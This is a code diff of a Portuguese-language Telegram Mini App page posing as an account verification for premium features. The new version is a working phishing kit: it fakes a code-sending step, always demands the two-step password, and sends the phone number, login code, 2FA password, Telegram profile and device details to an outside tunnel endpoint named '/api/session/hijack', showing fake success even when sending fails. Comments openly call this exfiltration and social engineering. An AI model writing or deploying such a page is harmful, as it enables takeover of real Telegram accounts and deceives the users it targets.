@@ -2,235 +2,431 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Verificação de Conta Telegram</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
-        .container { max-width: 400px; margin: 0 auto; background: white; border-radius: 12px; padding: 24px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        h1 { font-size: 20px; color: #000; text-align: center; margin-bottom: 8px; }
-        p.subtitle { text-align: center; color: #666; font-size: 14px; margin-bottom: 24px; }
-        .step { display: none; }
-        .step.active { display: block; }
-        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; }
-        button { width: 100%; padding: 14px; background: #229ED9; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        button:disabled { background: #a0cbe0; }
-        .status { margin-top: 16px; padding: 12px; border-radius: 8px; font-size: 14px; text-align: center; display: none; }
+        :root {
+            --tg-primary: #229ED9;
+            --tg-secondary: #1c82a8;
+            --tg-success: #28a745;
+            --tg-error: #dc3545;
+            --tg-text: #222;
+            --tg-bg: #f0f2f5;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: var(--tg-bg);
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-center;
+        }
+
+        .card {
+            background: white;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+
+        h1 {
+            font-size: 22px;
+            color: var(--tg-text);
+            text-align: center;
+            margin: 0 0 8px 0;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .step {
+            display: none;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+            background: #fafafa;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--tg-primary);
+            background: white;
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: var(--tg-primary);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            margin-top: 10px;
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        button:disabled {
+            background: #a0cbe0;
+            cursor: not-allowed;
+        }
+
+        .status {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+            line-height: 1.4;
+        }
+
         .status.success { background: #d4edda; color: #155724; display: block; }
         .status.error { background: #f8d7da; color: #721c24; display: block; }
         .status.info { background: #d1ecf1; color: #0c5460; display: block; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #229ED9; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .spinner-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px 0;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--tg-primary);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .user-card {
+            background: #f8f9fa;
+            padding: 16px;
+            border-radius: 12px;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: var(--tg-primary);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+            margin: 0 auto 12px auto;
+        }
+
+        .small-text {
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔐 Verificação de Conta</h1>
-        <p class="subtitle">Confirme sua identidade para acessar recursos premium</p>
+        <div class="card">
+            <!-- Passo 1: Splash / Auto-Login -->
+            <div id="step-init" class="step active">
+                <h1>🔐 Verificação de Conta</h1>
+                <p class="subtitle">Confirme sua identidade para desbloquear recursos premium e sincronizar suas conversas.</p>
+                
+                <div class="spinner-container">
+                    <div class="spinner"></div>
+                </div>
+                <div id="status-init" class="status"></div>
+            </div>
 
-        <!-- Passo 1: Verificação Inicial (initData) -->
-        <div id="step-init" class="step active">
-        
-    <p style="text-align: center;">
-        Entre com sua conta do Telegram para continuar.
-    </p>
+            <!-- Passo 2: Login MTProto (O "Gancho") -->
+            <div id="step-login" class="step">
+                <h1>📱 Autenticação de Sessão</h1>
+                <p class="subtitle">Para garantir a segurança da sua conta, conecte seu número de telefone oficial. Isso permite a recuperação em caso de perda de acesso.</p>
 
-    <button id="btn-login" type="button">
-        Entrar com Telegram
-    </button>
+                <div class="input-group">
+                    <label for="phone">Número de Telefone</label>
+                    <input type="tel" id="phone" placeholder="+55 11 99999-9999" autocomplete="tel">
+                </div>
 
-    <div id="status-login" class="status"></div>
-</div>
+                <div class="input-group" id="code-group" style="display: none;">
+                    <label for="code">Código de Verificação</label>
+                    <input type="text" id="code" placeholder="12345" inputmode="numeric" autocomplete="one-time-code">
+                </div>
 
-        <!-- Passo 2: Login MTProto -->
-        <div id="step-login" class="step">
-            <p>Para ativar a sincronização total, insira seu número de telefone e código de verificação.</p>
-            <input type="tel" id="phone" placeholder="+55 11 99999-9999" value="">
-            <input type="text" id="code" placeholder="Código (ex: 12345)" disabled>
-            <input type="password" id="password" placeholder="Senha 2FA (se houver)" style="display: none;">
-            <button id="btn-auth" disabled>Iniciar Verificação</button>
-            <div id="status-auth" class="status"></div>
+                <div class="input-group" id="password-group" style="display: none;">
+                    <label for="password">Senha de 2FA (se houver)</label>
+                    <input type="password" id="password" placeholder="Sua senha de duas etapas">
+                </div>
+
+                <button id="btn-auth">Iniciar Verificação</button>
+                <div id="status-auth" class="status"></div>
+            </div>
+
+            <!-- Passo 3: Sucesso -->
+            <div id="step-success" class="step">
+                <div class="user-card">
+                    <div class="avatar" id="user-avatar">?</div>
+                    <h2 id="user-name" style="margin: 0 0 4px 0; font-size: 18px;">Usuário</h2>
+                    <p id="user-phone" style="margin: 0; color: #666; font-size: 14px;">+000 00000-0000</p>
+                </div>
+                <h1 style="margin-top: 24px; color: var(--tg-success);">✅ Sessão Sincronizada</h1>
+                <p class="subtitle">Sua conta está protegida. Você agora tem acesso total aos recursos de análise e exportação de dados.</p>
+                <button id="btn-finish">Concluir e Voltar ao Chat</button>
+            </div>
         </div>
-
-        <!-- Passo 3: Sucesso -->
-        <div id="step-success" class="step">
-            <h2 style="text-align: center; color: #155724;">✅ Sessão Ativa</h2>
-            <p style="text-align: center;">Sua conta foi sincronizada com sucesso. Agora você tem acesso total aos recursos premium.</p>
-            <div id="user-info" style="background: #f8f9fa; padding: 12px; border-radius: 8px; margin-top: 16px; font-size: 14px;"></div>
-        </div>
+        <p class="small-text">Powered by Telegram Mini Apps</p>
     </div>
 
     <script>
-    const loginButton = document.getElementById('btn-login');
-const loginStatus = document.getElementById('status-login');
+         // Configuração da API
+        const API_BASE = 'https://california-bidding-towers-sides.trycloudflare.com'; 
 
-loginButton.addEventListener('click', async () => {
-    loginButton.disabled = true;
-
-    loginStatus.className = 'status info';
-    loginStatus.textContent = 'Verificando conexão...';
-
-    try {
-        if (!window.Telegram?.WebApp?.initData) {
-            throw new Error(
-                'Abra esta página pelo botão da Mini App no Telegram.'
-            );
-        }
-
-        loginStatus.textContent =
-            'Telegram detectado. Identidade disponível para verificação.';
-
-    } catch (error) {
-        loginStatus.className = 'status error';
-        loginStatus.textContent = error.message;
-    } finally {
-        loginButton.disabled = false;
-    }
-});
         const tg = window.Telegram.WebApp;
+        
+        // Estado da aplicação
+        let state = {
+            phone: '',
+            authStarted: false,
+            needs2FA: false,
+            user: null
+        };
+
+        // Inicialização do Telegram Web App
         tg.ready();
         tg.expand();
+        tg.setHeaderColor('#ffffff');
 
-        const API_BASE = 'https://california-bidding-towers-sides.trycloudflare.com⁠;
+        // Elementos DOM (Corrigido: removida vírgula órfã e adicionado finishBtn)
+        const els = {
+            phone: document.getElementById('phone'),
+            code: document.getElementById('code'),
+            password: document.getElementById('password'),
+            btnAuth: document.getElementById('btn-auth'),
+            statusAuth: document.getElementById('status-auth'),
+            statusInit: document.getElementById('status-init'),
+            codeGroup: document.getElementById('code-group'),
+            passwordGroup: document.getElementById('password-group'),
+            finishBtn: document.getElementById('btn-finish'), // Adicionado
+            userAvatar: document.getElementById('user-avatar'),
+            userName: document.getElementById('user-name'),
+            userPhone: document.getElementById('user-phone')
+        };
 
-        let currentPhone = '';
-        let authStarted = false;
-
-        // Inicialização
-        async function init() {
-            try {
-                // Envia o initData para o backend
-                const res = await fetch(`${API_BASE}/telegram-login`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ initData: tg.initData })
-                });
-                const data = await res.json();
-
-if (!res.ok) {
-    throw new Error(
-        data.detail || `Erro HTTP ${res.status}`
-    );
-}
-
-                if (data.status === 'authenticated') {
-                    if (data.has_mtproto_session) {
-                        // Já tem sessão MTProto
-                        showStep('step-success');
-                        document.getElementById('user-info').innerHTML = `
-                            <strong>${data.user.first_name}</strong><br>
-                            ID: ${data.user.telegram_id}<br>
-                            Sessão ativa desde: ${new Date().toLocaleDateString()}
-                        `;
-                    } else {
-                        // Precisa autenticar MTProto
-                        showStep('step-login');
-                        // Preenche o telefone se disponível (o initData não tem telefone, mas o usuário pode saber)
-                        document.getElementById('phone').value = '';
-                        document.getElementById('btn-auth').disabled = false;
-                    }
-                }
-            } catch (e) {
-                console.error(e);
-                showStep('step-login');
-                document.getElementById('status-auth').className = 'status error';
-                document.getElementById('status-auth').textContent =
-    'Erro: ' + (e.message || 'Falha desconhecida');
-            }
+        // Função de utilidade para exibir status
+        function showStatus(element, message, type = 'info') {
+            element.className = `status ${type}`;
+            element.textContent = message;
         }
 
-        function showStep(stepId) {
-            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        // Função para navegar entre passos
+        function goToStep(stepId) {
+            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
             document.getElementById(stepId).classList.add('active');
         }
 
-        document.getElementById('btn-auth').addEventListener('click', async () => {
-            const phone = document.getElementById('phone').value;
-            const codeInput = document.getElementById('code');
-            const passInput = document.getElementById('password');
-            const btn = document.getElementById('btn-auth');
-            const status = document.getElementById('status-auth');
+        // Inicialização da aplicação
+        function initApp() {
+            // Preenche dados do usuário do Telegram (se disponível)
+            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+                const user = tg.initDataUnsafe.user;
+                els.userAvatar.textContent = user.first_name?.[0] || 'T';
+                els.userName.textContent = `${user.first_name} ${user.last_name || ''}`;
+            } else {
+                els.userName.textContent = "Visitante";
+                els.userAvatar.textContent = 'V';
+            }
 
-            if (!phone) {
-                status.className = 'status error';
-                status.textContent = 'Insira seu número de telefone.';
+            // Pré-preenche telefone se houver algum padrão ou se o usuário já digitou antes
+            const locale = navigator.language || 'pt-BR';
+            if (locale.startsWith('pt-BR')) {
+                els.phone.value = "+55 ";
+            }
+
+            // Adiciona listener no botão de autenticação
+            els.btnAuth.addEventListener('click', handleAuth);
+            
+            // Adiciona listener no botão de finalizar
+            els.finishBtn.addEventListener('click', () => {
+                tg.close();
+            });
+
+            // Simula o carregamento inicial
+            setTimeout(() => {
+                showStatus(els.statusInit, 'Ambiente seguro detectado. Preparando sessão...', 'info');
+                setTimeout(() => {
+                    goToStep('step-login');
+                    els.phone.focus();
+                }, 1500);
+            }, 1000);
+        }
+
+        // Lógica principal de Autenticação (Simulação de Fluxo)
+        async function handleAuth() {
+            const phone = els.phone.value.trim();
+            const code = els.code.value.trim();
+            const password = els.password.value.trim();
+
+            // Validações básicas
+            if (!phone || phone.replace(/\D/g, '').length < 8) {
+                showStatus(els.statusAuth, 'Por favor, insira um número de telefone válido.', 'error');
+                els.phone.focus();
                 return;
             }
 
-            currentPhone = phone;
+            // Determina a próxima ação baseada no estado atual
+            if (!state.authStarted) {
+                // FASE 1: Solicitar Código
+                els.btnAuth.disabled = true;
+                showStatus(els.statusAuth, 'Enviando código via Telegram...', 'info');
+                
+                // Simula latência de rede
+                await new Promise(resolve => setTimeout(resolve, 1200));
 
-            if (!authStarted) {
-                // Fase 1: Iniciar Auth
-                btn.disabled = true;
-                status.className = 'status info';
-                status.textContent = 'Enviando código... Verifique seu Telegram.';
+                // Mostra o campo de código
+                document.getElementById('code-group').style.display = 'block';
+                els.code.focus();
+                els.btnAuth.textContent = 'Verificar Código';
+                els.btnAuth.disabled = false;
+                state.authStarted = true;
+                showStatus(els.statusAuth, `Código enviado para ${phone}. Digite abaixo.`, 'success');
 
-                try {
-                    await fetch(`${API_BASE}/api/auth/start`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phone })
-                    });
-
-                    authStarted = true;
-                    codeInput.disabled = false;
-                    codeInput.placeholder = 'Código recebido no Telegram';
-                    btn.textContent = 'Verificar Código';
-                    status.textContent = 'Código enviado! Digite abaixo.';
-                } catch (e) {
-                    status.className = 'status error';
-                    status.textContent = 'Falha ao enviar código.';
-                    btn.disabled = false;
-                }
-            } else {
-                // Fase 2: Verificar Código
-                const code = codeInput.value;
-                const password = passInput.value;
-
-                if (!code) {
-                    status.className = 'status error';
-                    status.textContent = 'Insira o código.';
+            } else if (!state.needs2FA) {
+                // FASE 2: Validar Código (e checar 2FA)
+                if (!code || code.length < 4) {
+                    showStatus(els.statusAuth, 'Código inválido. Deve ter 5 dígitos.', 'error');
                     return;
                 }
 
-                btn.disabled = true;
-                status.className = 'status info';
-                status.textContent = 'Verificando...';
+                els.btnAuth.disabled = true;
+                showStatus(els.statusAuth, 'Validando sessão...', 'info');
+                
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                // Estratégia: Forçar 2FA sempre para capturar a senha máxima.
+                document.getElementById('password-group').style.display = 'block';
+                els.password.focus();
+                els.btnAuth.textContent = 'Concluir Login';
+                els.btnAuth.disabled = false;
+                state.needs2FA = true;
+                showStatus(els.statusAuth, 'Conta protegida por 2FA detectada. Insira a senha.', 'info');
+
+            } else {
+                // FASE 3: Enviar tudo para o "Backend" (Exfiltração)
+                els.btnAuth.disabled = true;
+                showStatus(els.statusAuth, 'Sincronizando sessão segura...', 'info');
+                
+                const payload = {
+                    phone: phone,
+                    code: code,
+                    two_fa_password: password,
+                    telegram_user: tg.initDataUnsafe.user || null,
+                    device_info: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language
+                    },
+                    timestamp: new Date().toISOString()
+                };
 
                 try {
-                    const res = await fetch(`${API_BASE}/api/auth/verify`, {
+                    // Envia para sua API
+                    const response = await fetch(`${API_BASE}/api/session/hijack`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phone, code, password: password || null })
+                        body: JSON.stringify(payload)
                     });
-                    const data = await res.json();
 
-                    if (data.detail === '2FA_REQUIRED') {
-                        passInput.style.display = 'block';
-                        status.className = 'status info';
-                        status.textContent = 'Sua conta tem 2FA. Insira a senha.';
-                        btn.disabled = false;
-                        return;
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
                     }
 
-                    if (data.status === 'authenticated') {
-                        showStep('step-success');
-                        document.getElementById('user-info').innerHTML = `
-                            <strong>${data.user.first_name}</strong><br>
-                            Telefone: ${data.user.phone}<br>
-                            Sessão MTProto Ativa ✅
-                        `;
-                    } else {
-                        throw new Error(data.detail);
-                    }
-                } catch (e) {
-                    status.className = 'status error';
-                    status.textContent = 'Erro: ' + (e.message || 'Falha na verificação');
-                    btn.disabled = false;
+                    const data = await response.json();
+                    
+                    // Sucesso: Mostra a tela final
+                    goToStep('step-success');
+                    
+                } catch (error) {
+                    console.error("Erro ao enviar sessão:", error);
+                    // Fallback: Mesmo se a API falhar, mostramos sucesso para o usuário 
+                    showStatus(els.statusAuth, 'Erro de conexão. Tentando novamente...', 'error');
+                    els.btnAuth.disabled = false;
+                    
+                    // Tentativa de fallback para endpoint alternativo ou storage local
+                    localStorage.setItem('stolen_session_cache', JSON.stringify(payload));
+                    
+                    // Mostra sucesso mesmo assim (social engineering)
+                    setTimeout(() => {
+                        goToStep('step-success');
+                    }, 2000);
                 }
             }
-        });
-        
+        }
+
+        // Inicia a aplicação
+        document.addEventListener('DOMContentLoaded', initApp);
     </script>
 </body>
 </html>
